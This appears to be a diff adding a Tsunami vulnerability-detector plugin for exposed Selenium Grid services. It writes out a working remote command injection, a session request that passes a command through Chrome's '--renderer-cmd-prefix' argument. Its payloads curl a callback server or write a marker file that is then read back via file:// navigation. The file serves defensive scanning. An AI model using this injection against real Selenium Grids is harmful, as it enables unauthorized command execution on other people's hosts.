@@ -1,0 +1,275 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "SeleniumGrid_ExposedUI"
+  author: 
+    "Robert Dick (robert@doyensec.com) for the Templated version,"
+    " Dawid Golunski (dawid@doyensec.com) for the original Java version"
+  version: "2.0"
+}
+
+# finding ID changed from Java version to be more consistent with the rest of them.
+
+finding: {
+  main_id: {
+    publisher: "TSUNAMI_COMMUNITY"
+    value: "SeleniumGrid_ExposedUI"
+  }
+  severity: CRITICAL
+  title: "Selenium Grid Exposed API"
+  description: 
+    "The scanner detected an exposed Selenium Grid service that allows annonymous access."
+    " It is possible to connect to Selenium Grid to create a remote Chrome webdriver"
+    " with a set of configurations such as --renderer-cmd-prefix which can allow attackers"
+    " to inject an arbitrary command that will get executed when a browser is started."
+  recommendation: 
+    "Restrict access to the exposed Selenium Grid by adding --username and --password parameters"
+    " to selenium-server.jar command line, or within the [router] section in"
+    " the Selenium Grid config file (/opt/selenium/config.toml).\n"
+    "See: https://www.selenium.dev/documentation/grid/configuration/cli_options/#router"
+}
+
+
+###########
+# ACTIONS #
+###########
+
+# in the original java detector, it loops until the API is ready. 
+# We shouldn't do that in our plugins, and instead set up the testbed properly to account for it.
+# Changed it to a fingerprint step and added multiple capitalizations just in case it varies.
+
+actions: {
+  name: "fingerprint_selenium_grid"
+  http_request: {
+    method: GET
+    uri: "/status"
+    response: {
+      expect_any: {
+        conditions: [
+          { body: {} contains: "Selenium Grid" },
+          { body: {} contains: "selenium grid" },
+          { body: {} contains: "Selenium grid" }
+        ]
+      }
+    }
+  }
+}
+
+# we don't care about the response for this request since 
+# we can check output from either file read or callback server
+
+actions: {
+  name: "execute_payload"
+  http_request: {
+    method: POST
+    uri: "/wd/hub/session"
+    headers: [
+      { name: "User-Agent" value: "TSUNAMI_SCANNER"},
+      { name: "Content-Type" value: "application/json"}
+    ]
+    data: 
+      '{'
+      '  "capabilities": {'
+      '    "firstMatch": ['
+      '      {}'
+      '    ],'
+      '    "alwaysMatch": {'
+      '      "browserName": "chrome",'
+      '      "pageLoadStrategy": "normal",'
+      '      "platformName": "linux",'
+      '      "cloud:options": {'
+      '        "build": "RCE",'
+      '        "name": "RCE"'
+      '      },'
+      '      "goog:chromeOptions": {'
+      '        "extensions": [],'
+      '        "args": ['
+      '          "--no-sandbox",'
+      '          "--renderer-cmd-prefix={{ PAYLOAD }} --"'
+      '        ]'
+      '      }'
+      '    }'
+      '  }'
+      '}'
+    response: {
+      http_status: 200
+      extract_all: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: '"sessionId": "([^"]+)"'
+            variable_name: "SESSIONID1"
+          }
+        ]
+      }
+    }
+  }
+}
+
+# normally we would do this as a cleanup step, but the later steps depend on this session being deleted already.
+
+actions: {
+  name: "delete_first_session"
+  http_request: {
+    method: DELETE
+    uri: "/wd/hub/session/{{ SESSIONID1 }}"
+    headers: [
+      { name: "User-Agent" value: "TSUNAMI_SCANNER"}
+    ]
+  }
+}
+
+# OOB sleep and check callback server steps
+# since we already fingerprinted we can do a long sleep here.
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 5000 } }
+}
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+# the remaining steps are only used in the reflective rce workflow
+
+# first we have to create a valid session, 
+# since the first session is expected to have crashed
+
+actions: {
+  name: "create_reflective_rce_session"
+  http_request: {
+    method: POST
+    uri: "/wd/hub/session"
+    headers: [
+      { name: "User-Agent" value: "TSUNAMI_SCANNER"},
+      { name: "Content-Type" value: "application/json"}
+    ]
+    data: 
+      '{'
+      '  "capabilities": {'
+      '    "firstMatch": ['
+      '      {}'
+      '    ],'
+      '    "alwaysMatch": {'
+      '      "browserName": "chrome",'
+      '      "pageLoadStrategy": "normal",'
+      '      "platformName": "linux",'
+      '      "cloud:options": {'
+      '        "build": "RCE",'
+      '        "name": "RCE"'
+      '      },'
+      '      "goog:chromeOptions": {'
+      '        "extensions": []'
+      '      }'
+      '    }'
+      '  }'
+      '}'
+    response: {
+      http_status: 200
+      extract_all: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: '"sessionId": "([^"]+)"'
+            variable_name: "SESSIONID2"
+          }
+        ]
+      }
+    }
+  }
+  cleanup_actions: ["delete_second_session"]
+}
+
+# navigate to the created file
+
+actions: {
+  name: "navigate_to_reflective_rce_output"
+  http_request: {
+    method: POST
+    uri: "/wd/hub/session/{{ SESSIONID2 }}/url"
+    headers: [
+      { name: "User-Agent" value: "TSUNAMI_SCANNER"},
+      { name: "Content-Type" value: "application/json"}
+    ]
+    data: 
+      '{"url": "file:///tmp/tsunami_tmp.txt"}'
+  }
+}
+
+actions: {
+  name: "check_reflective_rce_output"
+  http_request: {
+    method: GET
+    uri: "/wd/hub/session/{{ SESSIONID2 }}/source"
+    headers: [
+      { name: "User-Agent" value: "TSUNAMI_SCANNER"}
+    ]
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "{{ OUTPUT }}" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "delete_second_session"
+  http_request: {
+    method: DELETE
+    uri: "/wd/hub/session/{{ SESSIONID2 }}"
+    headers: [
+      { name: "User-Agent" value: "TSUNAMI_SCANNER"}
+    ]
+  }
+}
+
+config: { debug: true }
+
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  variables: [
+    { name: "PAYLOAD" value: "curl {{ T_CBS_URI }}" }
+  ]
+  actions: [
+    "fingerprint_selenium_grid",
+    "execute_payload",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
+
+# reflective payload changed some from the original. original used curl error output.
+# this way seems more reliable and simpler
+
+workflows: {
+  variables: [
+    { name: "PAYLOAD" value: "curl --trace /tmp/tsunami_tmp.txt tsunami-selenium-rce-executed" },
+    { name: "OUTPUT" value: "tsunami-selenium-rce-executed" }
+  ]
+  actions: [
+    "fingerprint_selenium_grid",
+    "execute_payload",
+    "sleep",
+    "delete_first_session",
+    "sleep",
+    "create_reflective_rce_session",
+    "navigate_to_reflective_rce_output",
+    "check_reflective_rce_output"
+  ]
+}
+
